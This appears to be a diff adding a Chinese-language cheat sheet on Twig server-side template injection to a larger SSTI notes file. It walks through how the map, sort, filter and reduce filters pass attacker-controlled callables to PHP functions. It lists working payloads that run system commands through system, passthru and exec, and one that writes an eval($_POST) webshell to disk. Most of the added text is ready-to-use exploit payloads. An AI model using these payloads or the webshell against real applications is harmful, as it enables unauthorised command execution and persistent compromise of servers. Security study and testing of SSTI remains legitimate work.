@@ -75,11 +75,121 @@ string:{$s=$smarty.template_object->smarty}{$fp=$smarty.template_object->compile
 ```
 
 ### Twig
+#### 基本使用
 - `{{_self}}`  指向当前应用
 - `{{_self.env}}` 
 - `{{dump(app)}}`
 - `{{app.request.server.all|join(',')}}`
+##### 全局变量
+- `_context`：引用当前上下文
+- `_charset`：引用当前字符集
+##### 设置变量
+```php
+{% set foo = 'foo' %}
+{% set foo = [1, 2] %}
+{% set foo = {'foo': 'bar'} %}
+```
 
+#### 主要利用
+##### map过滤器
+```php
+function twig_array_map($array $arrow){
+	$r = [];
+	foreach ($array as $k => $v) {
+		$r[$k] = $arrow($v $k);
+	}
+	return $r;
+}
+```
+`$array`和`$arrow`都是我们可控的，那我们就可以找到有两个参数的、可以实现命令执行的危险函数来进行rce
+
+```php
+system ( string $command [, int &$return_var ] ) : string
+passthru ( string $command [, int &$return_var ] )
+exec ( string $command [, array &$output [, int &$return_var ]] ) : string
+```
+
+payload
+```
+{{["whoami"]|map("system")}}
+{{["whoami"]|map("passthru")}}
+{{["whoami"]|map("exec")}} // 无回显
+```
+
+##### sort过滤器
+```php
+function twig_sort_filter($array, $arrow = null) {
+	if ($array instanceof \Traversable) {
+		$array = iterator_to_array($array);
+	} elseif (!\is_array($array)) {
+		throw new RuntimeError(sprintf('The sort filter only works with arrays or "Traversable", got "%s".', \gettype($array)));
+	}
+	if (null !== $arrow) {
+		uasort($array, $arrow); // 直接被 uasort 调用
+	} else {
+		asort($array);
+	}
+	return $array;
+}
+```
+
+```php
+uasort ( array &$array , callable $value_compare_func ) : bool
+```
+`$array`和`$arrow`直接被`uasort`调用,uasort会将数组中的元素按照键值进行排序，当我们自定义一个危险函数时，就可能造成rce
+
+```php
+{{["id", 0]|sort("system")}}
+{{["id", 0]|sort("passthru")}}
+{{["id", 0]|sort("exec")}} // 无回显
+```
+
+##### filter过滤器
+```php
+function twig_array_filter($array, $arrow) {
+	if (\is_array($array)) {
+		return array_filter($array, $arrow, \ARRAY_FILTER_USE_BOTH); // $array 和 $arrow 直接被 array_filter 函数调用
+	}
+	// the IteratorIterator wrapping is needed as some internal PHP classes are \Traversable but do not implement \Iterator
+	return new \CallbackFilterIterator(new \IteratorIterator($array), $arrow);
+}
+```
+
+```php
+array_filter ( array $array [, callable $callback [, int $flag = 0 ]] ) : array
+```
+
+payload
+```php
+{{["id"]|filter("system")}}
+{{["id"]|filter("passthru")}}
+{{["id"]|filter("exec")}} // 无回显
+
+{{{"<?php phpinfo();eval($_POST[whoami]);":"D:\\phpstudy_pro\\WWW\\shell.php"}|filter("file_put_contents")}} // 和map过滤器一样可以写 Webshell
+```
+
+
+##### reduce 过滤器
+```php
+function twig_array_reduce($array, $arrow, $initial = null) {
+	if (!\is_array($array)) {
+		$array = iterator_to_array($array);
+	}
+	return array_reduce($array, $arrow, $initial); // $array, $arrow 和 $initial 直接被 array_reduce 函数调用
+}
+```
+
+```php
+array_reduce ( array $array , callable $callback [, mixed $initial = NULL ] ) : mixed
+```
+
+`$array`和 `$arrow`直接被 `array_filter`函数调用，我们可以利用该性质自定义一个危险函数从而达到rce
+
+```php
+{{[0, 0]|reduce("system", "id")}}
+{{[0, 0]|reduce("passthru", "id")}}
+{{[0, 0]|reduce("exec", "id")}} // 无回显
+```
 # 参考文章
 [一文了解SSTI和所有常见payload 以flask模板为例-腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/2130787)
 [【网络安全 | 1.5w字总结】SSTI漏洞入门，这一篇就够了。-CSDN博客](https://blog.csdn.net/2301_77485708/article/details/132467976)
